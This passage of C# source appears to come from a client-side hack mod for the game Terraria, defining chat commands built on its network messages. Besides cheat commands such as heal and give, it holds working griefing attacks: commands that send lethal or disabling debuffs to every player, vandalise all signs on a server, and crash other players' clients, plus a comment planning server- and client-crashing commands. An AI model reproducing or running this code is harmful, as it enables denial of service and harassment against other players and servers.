                    NetMessage.SendData(21, -1, -1, "", index3, 0f, 0f, 0f, 0);
                    NetMessage.SendData(21, -1, -1, "", index4, 0f, 0f, 0f, 0);
                }
            }
            Main.NewText("Healed " + Main.player[healtarget].name, 255, 240, 20);
        }

        public static void give(string[] args, int length, string full)
        {
            int gift;
            if (length == 3 && int.TryParse(args[1], out gift))
            {
                int givetarget = GetPlayer(full.Substring(full.IndexOf(' ', full.IndexOf(' ') + 1)));
                if (givetarget < 0)
                {
                    Main.NewText("Player not found!", 255, 20, 20);
                    return;
                }
                int index5 = Item.NewItem((int)Main.player[givetarget].position.X, (int)Main.player[givetarget].position.Y, Main.player[givetarget].width, Main.player[givetarget].height, 0x3a, 1, false, 0);
                if (Main.netMode == 1)
                {
                    NetMessage.SendData(21, -1, -1, "", index5, 0f, 0f, 0f, 0);
                }
                Main.NewText("Gave " + Main.player[givetarget].name + " a gift of " + gift.ToString(), 255, 240, 20);
            }
            else
            {
                Main.NewText("Usage: -give <itemID> <player>", 255, 240, 20);
            }
        }

        public static void setstats(string[] args, int length, string full)
        {
            if (length <= 1)
            {
                Main.player[Main.myPlayer].statLifeMax = 400;
                Main.player[Main.myPlayer].statManaMax = 260;
                Main.player[Main.myPlayer].statLife = Main.player[Main.myPlayer].statLifeMax;
                Main.player[Main.myPlayer].statMana = Main.player[Main.myPlayer].statManaMax;
                Main.NewText("Reset to default max", 255, 240, 20);
            }
            else if (length == 2)
            {
                int health;
                if (int.TryParse(args[1], out health))
                {
                    Main.player[Main.myPlayer].statLifeMax = health;
                    Main.NewText("Health max set to " + health.ToString(), 255, 240, 20);
                }
            }
            else if (length == 3)
            {
                int health;
                int mana;
                if (int.TryParse(args[1], out health))
                    return;
                if (!int.TryParse(args[2], out mana))
                    return;
                Main.player[Main.myPlayer].statLifeMax = health;
                Main.player[Main.myPlayer].statManaMax = mana;
                Main.NewText("Health/mana max set to " + health.ToString() + "/" + mana.ToString(), 255, 240, 20);
            }
            else
            {
                Main.NewText("Usage: -setstats <Health> <Mana>", 255, 240, 20);
            }
        }

        public static void repeat(string[] args, int length, string full)
        {
            if (lastCommand == "repeat")
            {
                Main.NewText("Can't repeat a repeat command!", 255, 20, 20);
                return;
            }
            if (lastCommand == null)
            {
                Main.NewText("No previous commands!", 255, 20, 20);
                return;
            }
            string full2 = lastCommand.Substring(1);
            string[] args2 = full2.Split(' ');
            if (!ZidoMod.OnCommand(args2[0].ToLower(), args2, args2.Length, full2))
            {
                Main.NewText("Command Failed", 255, 20, 20);
            }
        }

        public static void skeletron(string[] args, int length, string full)
        {
            if (NPC.downedBoss3)
                return;
            NetMessage.SendData(0x33, -1, -1, "", 0, 1f, 0f, 0f, 0);
        }

        public static void fireplrs(string[] args, int length, string full)
        {
            int buffplayers = 0;
            for (int i = 0; i < Main.player.Length; i++)
            {
                if (Main.player[i].active)
                {
                    if (Main.netMode == 1)
                    {
                        NetMessage.SendData(55, -1, -1, "", i, 20, Int16.MaxValue, 0f, 0);
                        NetMessage.SendData(55, -1, -1, "", i, 24, Int16.MaxValue, 0f, 0);
                        NetMessage.SendData(55, -1, -1, "", i, 39, Int16.MaxValue, 0f, 0);
                    }
                    buffplayers++;
                }
            }
            Main.NewText("Slowly killing " + buffplayers + " players", 255, 240, 20);
        }

        public static void disableplrs(string[] args, int length, string full)
        {
            int disableplayers = 0;
            for (int i = 0; i < Main.player.Length; i++)
            {
                if (Main.player[i].active)
                {
                    if (Main.netMode == 1)
                    {
                        NetMessage.SendData(55, -1, -1, "", i, 31, Int16.MaxValue, 0f, 0);
                        NetMessage.SendData(55, -1, -1, "", i, 32, Int16.MaxValue, 0f, 0);

                        NetMessage.SendData(55, -1, -1, "", i, 22, Int16.MaxValue, 0f, 0);
                        NetMessage.SendData(55, -1, -1, "", i, 23, Int16.MaxValue, 0f, 0);

                        NetMessage.SendData(55, -1, -1, "", i, 35, Int16.MaxValue, 0f, 0);
                        NetMessage.SendData(55, -1, -1, "", i, 36, Int16.MaxValue, 0f, 0);
                    }
                    disableplayers++;
                }
            }
            Main.NewText("Disabled " + disableplayers + " players", 255, 240, 20);
        }

        public static void say(string[] args, int length, string full)
        {
            if (length > 1)
            {
                string saytext = string.Join(" ", args);
                saytext = saytext.Remove(0, 4);
                NetMessage.SendData(0x19, -1, -1, saytext, Main.myPlayer, 0f, 0f, 0f, 0);
            }
            else
                Main.NewText("Usage: -say <words>", 255, 240, 20);
        }

        public static void requestsigns(string[] args, int length, string full)
        {
            int playerx = (int)(Main.player[Main.myPlayer].position.X / 16f);
            int playery = (int)(Main.player[Main.myPlayer].position.Y / 16f);
            int countreq = 0;
            for (int x = (playerx - 400); x < (playerx + 400); x = (x + 2))
            {
                for (int y = (playery - 400); y < (playery + 400); y = (y + 2))
                {
                    if (x < 0 || x >= Main.maxTilesX || y < 0 || y >= Main.maxTilesY || (Main.tile[x, y] != null && Main.tile[x, y].type != 55 && Main.tile[x, y].type != 85))
                        continue;
                    countreq++;
                    NetMessage.SendData(46, -1, -1, "", x, y, 0f, 0f, 0);
                }
            }
            Main.NewText("Requested " + countreq + " signs around you", 255, 240, 20);
        }

        public static void wrecksigns(string[] args, int length, string full)
        {
            Vector2 oldposition = Main.player[Main.myPlayer].position;
            int countsigns = 0;
            for (int i = 0; i < 1000; i++)
            {
                if (Main.sign[i] != null)
                {
                    Main.sign[i].text = "REDIGIT WAS HERE";
                    Main.player[Main.myPlayer].position.X = Main.sign[i].x * 16;
                    Main.player[Main.myPlayer].position.Y = Main.sign[i].y * 16;
                    NetMessage.SendData(13, -1, -1, "", Main.myPlayer, 0f, 0f, 0f, 0);
                    NetMessage.SendData(47, -1, -1, "", i, 0f, 0f, 0f, 0);
                    countsigns++;
                }

            }
            Main.player[Main.myPlayer].position = oldposition;//restore old position so you don't end up really far away
            NetMessage.SendData(13, -1, -1, "", Main.myPlayer, 0f, 0f, 0f, 0);
            Main.NewText("Screwed up " + countsigns + " signs", 255, 240, 20);
        }

        public static void crashplrs(string[] args, int length, string full)
        {
            for (int i = 0; i < Main.player.Length; i++)
            {
                if (Main.player[i].active && i != Main.myPlayer)
                {
                    int projindex = Projectile.NewProjectile(Main.player[i].position.X / 16, Main.player[i].position.Y / 16, 0, 0, 23, 99, 0.0f, 0xff);
                    if (Main.netMode == 1)
                        NetMessage.SendData(0x1b, -1, -1, "", projindex, 0f, 0f, 0f, 0);
                }
            }
            Main.NewText("Crashed all (non-protected) players", 255, 240, 20);
        }



        /*
         * Commands:
         * 
         * RainProjectile
         * RainLiquid
         * RainTile
         * RainItems
         * 
         * QuickBars
         * 
         * SpoofInventory
         * SpawnMob (Statues)
         * 
         * CrashServer
         * CrashClients
         * 
         */
    }
}
